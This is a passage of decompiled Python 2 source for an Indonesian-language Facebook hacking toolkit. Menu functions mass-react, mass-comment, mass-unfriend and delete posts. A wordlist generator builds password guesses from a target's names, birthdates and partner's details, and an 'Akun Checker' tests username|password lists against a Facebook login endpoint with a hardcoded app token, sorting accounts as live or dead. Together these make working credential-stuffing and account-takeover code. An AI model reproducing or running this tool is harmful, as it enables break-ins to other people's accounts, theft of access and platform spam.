            print '\r\x1b[1;91m[+]\x1b[1;97m Selesai \x1b[1;96m' + str(len(reaksi))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID Tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()


def grup_react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. \x1b[1;97mLike'
    print '\x1b[1;37;40m2. \x1b[1;97mLove'
    print '\x1b[1;37;40m3. \x1b[1;97mWow'
    print '\x1b[1;37;40m4. \x1b[1;97mHaha'
    print '\x1b[1;37;40m5. \x1b[1;97mSedih'
    print '\x1b[1;37;40m6. \x1b[1;97mMarah'
    print '\x1b[1;31;40m0. Back'
    print
    reactg_select()


def reactg_select():
    global tipe
    aksi = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if aksi == '':
        print '\x1b[1;91m[!] Jangan kosong'
        reactg_select()
    else:
        if aksi == '1':
            tipe = 'LIKE'
            reactg()
        else:
            if aksi == '2':
                tipe = 'LOVE'
                reactg()
            else:
                if aksi == '3':
                    tipe = 'WOW'
                    reactg()
                else:
                    if aksi == '4':
                        tipe = 'HAHA'
                        reactg()
                    else:
                        if aksi == '5':
                            tipe = 'SAD'
                            reactg()
                        else:
                            if aksi == '6':
                                tipe = 'ANGRY'
                                reactg()
                            else:
                                if aksi == '0':
                                    menu_bot()
                                else:
                                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + aksi + ' \x1b[1;91mThere is nothing'
                                    reactg_select()


def reactg():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Grup \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
        ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
        asw = json.loads(ah.text)
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
        try:
            oh = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            ah = json.loads(oh.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for a in ah['feed']['data']:
                y = a['id']
                reaksigrup.append(y)
                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '... \x1b[1;92m] \x1b[1;97m' + tipe

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Selesai \x1b[1;96m' + str(len(reaksigrup))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID Tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()


def bot_komen():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print "\x1b[1;91m[!] \x1b[1;92mGunakan \x1b[1;97m'<>' \x1b[1;92mUntuk Baris Baru"
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
        km = raw_input('\x1b[1;91m[+] \x1b[1;92mKomentar  \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
        km = km.replace('<>', '\n')
        try:
            p = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            a = json.loads(p.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for s in a['feed']['data']:
                f = s['id']
                komen.append(f)
                requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + km[:10].replace('\n', ' ') + '... \x1b[1;92m]'

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Selesai \x1b[1;96m' + str(len(komen))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID Tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()


def grup_komen():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print "\x1b[1;91m[!] \x1b[1;92mGunakan \x1b[1;97m'<>' \x1b[1;92mUntuk Baris Baru"
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Grup  \x1b[1;91m:\x1b[1;97m ')
        km = raw_input('\x1b[1;91m[+] \x1b[1;92mKomentar \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
        km = km.replace('<>', '\n')
        try:
            ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
            asw = json.loads(ah.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
            p = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            a = json.loads(p.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for s in a['feed']['data']:
                f = s['id']
                komengrup.append(f)
                requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + km[:10].replace('\n', ' ') + '... \x1b[1;92m]'

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Selesai \x1b[1;96m' + str(len(komengrup))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID Tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()


def deletepost():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
        nam = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        lol = json.loads(nam.text)
        nama = lol['name']
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[+] \x1b[1;92mFrom \x1b[1;91m: \x1b[1;97m%s' % nama
    jalan('\x1b[1;91m[+] \x1b[1;92mMulai menghapus postingan unfaedah\x1b[1;97m ...')
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    asu = requests.get('https://graph.facebook.com/me/feed?access_token=' + toket)
    asus = json.loads(asu.text)
    for p in asus['data']:
        id = p['id']
        piro = 0
        url = requests.get('https://graph.facebook.com/' + id + '?method=delete&access_token=' + toket)
        ok = json.loads(url.text)
        try:
            error = ok['error']['message']
            print '\x1b[1;91m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;91m] \x1b[1;95mGagal'
        except TypeError:
            print '\x1b[1;92m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;92m] \x1b[1;96mTerhapus'
            piro += 1
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[!] Koneksi Error'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()

    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_bot()


def accept():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
    r = requests.get('https://graph.facebook.com/me/friendrequests?limit=' + limit + '&access_token=' + toket)
    teman = json.loads(r.text)
    if '[]' in str(teman['data']):
        print '\x1b[1;91m[!] There is nothing permintaan pertemanan'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu_bot()
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    for i in teman['data']:
        gas = requests.post('https://graph.facebook.com/me/friends/' + i['from']['id'] + '?access_token=' + toket)
        a = json.loads(gas.text)
        if 'error' in str(a):
            print '\x1b[1;91m[+] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + i['from']['name']
            print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + i['from']['id'] + '\x1b[1;91m Gagal'
            print 40 * '\x1b[1;97m\xe2\x95\x90'
        else:
            print '\x1b[1;91m[+] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + i['from']['name']
            print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + i['from']['id'] + '\x1b[1;92m Berhasil'
            print 40 * '\x1b[1;97m\xe2\x95\x90'

    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_bot()


def unfriend():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;97mStop \x1b[1;91mCTRL+C'
        print
        try:
            pek = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            cok = json.loads(pek.text)
            for i in cok['data']:
                nama = i['name']
                id = i['id']
                requests.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + toket)
                print '\x1b[1;97m[\x1b[1;92mTerhapus\x1b[1;97m] ' + nama + ' => ' + id

        except IndexError:
            pass
        except KeyboardInterrupt:
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()

    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_bot()


def lain():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. Buat postingan'
    print '\x1b[1;37;40m2. Buat Wordlist'
    print '\x1b[1;37;40m3. Akun Checker'
    print '\x1b[1;37;40m4. Lihat daftar grup'
    print '\x1b[1;37;40m5. Profile Guard'
    print
    print '\x1b[1;97m  ->Coming soon<-'
    print
    print '\x1b[1;31;40m0. Back'
    print
    select_lain()


def select_lain():
    other = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if other == '':
        print '\x1b[1;91m[!] Jangan kosong'
        select_lain()
    else:
        if other == '1':
            status()
        else:
            if other == '2':
                wordlist()
            else:
                if other == '3':
                    check_akun()
                else:
                    if other == '4':
                        grupsaya()
                    else:
                        if other == '5':
                            guard()
                        else:
                            if other == '0':
                                menu()
                            else:
                                print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + other + ' \x1b[1;91mThere is nothing'
                                select_lain()


def status():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    msg = raw_input('\x1b[1;91m[+] \x1b[1;92mKetik status \x1b[1;91m:\x1b[1;97m ')
    if msg == '':
        print '\x1b[1;91m[!] Jangan kosong'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        lain()
    else:
        res = requests.get('https://graph.facebook.com/me/feed?method=POST&message=' + msg + '&access_token=' + toket)
        op = json.loads(res.text)
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[+] \x1b[1;92mStatus ID\x1b[1;91m : \x1b[1;97m' + op['id']
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        lain()


def wordlist():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;91m[?] \x1b[1;92mIsi data lengkap target dibawah'
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            a = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Depan \x1b[1;97m: ')
            file = open(a + '.txt', 'w')
            b = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Tengah \x1b[1;97m: ')
            c = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Belakang \x1b[1;97m: ')
            d = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Panggilan \x1b[1;97m: ')
            e = raw_input('\x1b[1;91m[+] \x1b[1;92mDate of birth >\x1b[1;96mex: |DDMMYY| \x1b[1;97m: ')
            f = e[0:2]
            g = e[2:4]
            h = e[4:]
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;91m[?] \x1b[1;93mKalo Jomblo SKIP aja :v'
            i = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Pacar \x1b[1;97m: ')
            j = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Panggilan Pacar \x1b[1;97m: ')
            k = raw_input('\x1b[1;91m[+] \x1b[1;92mDate of birth Pacar >\x1b[1;96mex: |DDMMYY| \x1b[1;97m: ')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
            l = k[0:2]
            m = k[2:4]
            n = k[4:]
            file.write('%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s' % (a, c, a, b, b, a, b, c, c, a, c, b, a, a, b, b, c, c, a, d, b, d, c, d, d, d, d, a, d, b, d, c, a, e, a, f, a, g, a, h, b, e, b, f, b, g, b, h, c, e, c, f, c, g, c, h, d, e, d, f, d, g, d, h, e, a, f, a, g, a, h, a, e, b, f, b, g, b, h, b, e, c, f, c, g, c, h, c, e, d, f, d, g, d, h, d, d, d, a, f, g, a, g, h, f, g, f, h, f, f, g, f, g, h, g, g, h, f, h, g, h, h, h, g, f, a, g, h, b, f, g, b, g, h, c, f, g, c, g, h, d, f, g, d, g, h, a, i, a, j, a, k, i, e, i, j, i, k, b, i, b, j, b, k, c, i, c, j, c, k, e, k, j, a, j, b, j, c, j, d, j, j, k, a, k, b, k, c, k, d, k, k, i, l, i, m, i, n, j, l, j, m, j, n, j, k))
            wg = 0
            while wg < 100:
                wg = wg + 1
                file.write(a + str(wg) + '\n')

            en = 0
            while en < 100:
                en = en + 1
                file.write(i + str(en) + '\n')

            word = 0
            while word < 100:
                word = word + 1
                file.write(d + str(word) + '\n')

            gen = 0
            while gen < 100:
                gen = gen + 1
                file.write(j + str(gen) + '\n')

            file.close()
            time.sleep(1.5)
            print '\n\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m: \x1b[1;97m %s.txt' % a
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()
        except IOError as e:
            print '\x1b[1;91m[!] Gagal membuat file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()


def check_akun():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[?] \x1b[1;92mIsi File\x1b[1;91m : \x1b[1;97musername|password'
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        live = []
        cek = []
        die = []
        try:
            file = raw_input('\x1b[1;91m[+] \x1b[1;92mFile \x1b[1;91m:\x1b[1;97m ')
            list = open(file, 'r').readlines()
        except IOError:
            print '\x1b[1;91m[!] File tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()

    pemisah = raw_input('\x1b[1;91m[+] \x1b[1;92mPemisah \x1b[1;91m:\x1b[1;97m ')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    for meki in list:
        username, password = meki.strip().split(str(pemisah))
        url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
        data = requests.get(url)
        mpsh = json.loads(data.text)
        if 'access_token' in mpsh:
            live.append(password)
            print '\x1b[1;97m[\x1b[1;92mLive\x1b[1;97m]  \x1b[1;97m' + username + ' | ' + password
        elif 'www.facebook.com' in mpsh['error_msg']:
            cek.append(password)
            print '\x1b[1;97m[\x1b[1;93mCheck\x1b[1;97m] \x1b[1;97m' + username + ' | ' + password
        else:
            die.append(password)
            print '\x1b[1;97m[\x1b[1;91mMati\x1b[1;97m]  \x1b[1;97m' + username + ' | ' + password

    print '\n\x1b[1;91m[+] \x1b[1;97mTotal\x1b[1;91m : \x1b[1;97mLive=\x1b[1;92m' + str(len(live)) + ' \x1b[1;97mCheck=\x1b[1;93m' + str(len(cek)) + ' \x1b[1;97mDie=\x1b[1;91m' + str(len(die))
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    lain()


def grupsaya():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        try:
            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
            gud = json.loads(uh.text)
            for p in gud['data']:
                nama = p['name']
                id = p['id']
                f = open('grupid.txt', 'w')
                listgrup.append(id)
                f.write(id + '\n')
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + str(nama)
                print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + str(id)
                print 40 * '\x1b[1;97m='

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah Grup \x1b[1;96m%s' % len(listgrup)
            print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m: \x1b[1;97mgrupid.txt'
            f.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()
        except KeyError:
            os.remove('grupid.txt')
            print '\x1b[1;91m[!] Grup tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] There is nothing koneksi'
            keluar()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()


def guard():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. Aktifkan'
    print '\x1b[1;37;40m2. NonAktifkan'
    print '\x1b[1;31;40m0. Back'
    print
    g = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if g == '1':
        aktif = 'true'
        gaz(toket, aktif)
    else:
        if g == '2':
            non = 'false'
            gaz(toket, non)
        else:
            if g == '0':
                lain()
            else:
                if g == '':
                    keluar()
                else:
                    keluar()


def get_userid(toket):
    url = 'https://graph.facebook.com/me?access_token=%s' % toket
    res = requests.get(url)
    uid = json.loads(res.text)
    return uid['id']


def gaz(toket, enable=True):
    id = get_userid(toket)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth %s' % toket}
    url = 'https://graph.facebook.com/graphql'
    res = requests.post(url, data=data, headers=headers)
    print res.text
    if '"is_shielded":true' in res.text:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDiaktifkan'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        lain()
    else:
        if '"is_shielded":false' in res.text:
            os.system('clear')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;91mDinonaktifkan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()
        else:
            print '\x1b[1;91m[!] Error'
            keluar()


if __name__ == '__main__':
	login()
# okay decompiling 3.pyc
